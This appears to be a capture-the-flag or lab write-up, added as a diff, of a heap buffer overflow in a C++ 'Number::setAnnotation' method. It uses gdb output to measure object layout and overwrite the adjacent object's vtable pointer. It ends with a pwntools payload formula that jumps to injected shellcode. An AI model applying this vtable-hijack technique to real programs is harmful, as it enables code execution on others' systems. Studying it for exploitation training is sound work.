@@ -1,0 +1,83 @@
+Woo, C++.
+
+The overflow is obviously in the `Number::setAnnotation(...)` value in overflowing the
+local variable `Number::annotation` with the argument.
+
+The method name, mangled is: `_ZN6Number13setAnnotationEPc`
+
+Allocations:
+   0x080486b7 <+35>:	call   0x80485bc <_Znwj@plt>
+   0x080486bc <+40>:	mov    ebx,eax
+   0x080486be <+42>:	mov    eax,ebx
+   0x080486c0 <+44>:	mov    DWORD PTR [esp+0x4],0x5
+   0x080486c8 <+52>:	mov    DWORD PTR [esp],eax
+   0x080486cb <+55>:	call   0x804879e <_ZN6NumberC1Ei>
+   0x080486d0 <+60>:	mov    DWORD PTR [esp+0x10],ebx
+
+We can see that the value for `*x` is now assigned into esp+0x10.
+
+
+   0x080486db <+71>:	call   0x80485bc <_Znwj@plt>
+   0x080486e0 <+76>:	mov    ebx,eax
+   0x080486e2 <+78>:	mov    eax,ebx
+   0x080486e4 <+80>:	mov    DWORD PTR [esp+0x4],0x6
+   0x080486ec <+88>:	mov    DWORD PTR [esp],eax
+   0x080486ef <+91>:	call   0x804879e <_ZN6NumberC1Ei>
+   0x080486f4 <+96>:	mov    DWORD PTR [esp+0x14],ebx
+
+We can see that the value for `*x` is now assigned into esp+0x14
+
+--
+Now, we want to dereference those values to figure out the memory address they
+are pointing to.  This tells you the distance in the HEAP between the two
+allocations.  We will set the break point above the virtual function call.
+
+	gdb-peda$ x $esp+0x10
+	0xbffffc30:	0x0804ea10
+	gdb-peda$ x $esp+0x14
+	0xbffffc34:	0x0804ea80
+
+The distance between these two numbers is 112.  This makes sense,
+	(In Byte Order)
+ 	`.vtable.op+` =   4 bytes
+	`.annotation` = 100 bytes
+	`.number`     =   4 bytes
+
+	TODO:  It appears the program requires 16 byte alignment, since
+	       108 / 16 is not an integer, it is bumped to 112.
+
+We can run it with ('w' * 100 + 'F' * 4 + 'A' * 4') and see the bytes
+
+	gdb-peda$ x/40 0x0804ea10
+	0x804ea10:	0x080488c8	0x77777777	0x77777777	0x77777777
+	0x804ea20:	0x77777777	0x77777777	0x77777777	0x77777777
+	0x804ea30:	0x77777777	0x77777777	0x77777777	0x77777777
+	0x804ea40:	0x77777777	0x77777777	0x77777777	0x77777777
+	0x804ea50:	0x77777777	0x77777777	0x77777777	0x77777777
+	0x804ea60:	0x77777777	0x77777777	0x77777777	0x77777777
+	0x804ea70:	0x77777777	0x77777777	0x46464646	0x41414141
+	0x804ea80:	0x080488c8	0x00000000	0x00000000	0x00000000
+	0x804ea90:	0x00000000	0x00000000	0x00000000	0x00000000
+	0x804eaa0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+We know that 0x804ea80 is the next object in memory and can notice the value for
+both objects is 0x080488c8.  Which we can dereference to see is the pointer to the
+virtual function.
+
+	gdb-peda$ x *0x080488c8
+	0x80487e2 <_ZN6NumberplERS_>:	0x8be58955
+
+So we need to add 4 new bytes to change the address of the virtual function call,
+we can not begin crafting our payload.
+
+1.  We need the payload to be 112.
+2.  The shell injection is 44 bytes.
+3.  The address of the target buffer is (0x804ea10 + 4) = 0x804ea14
+
+So the formula for it is....
+
+	pwn.p32(0x804ea10 + 4 + 4)
+      + SHELL_INJECTION
+      + (112 - len(shellcode) - 8) * 'w'
+      + pwn.p32(0x804ea10 + 4)
+
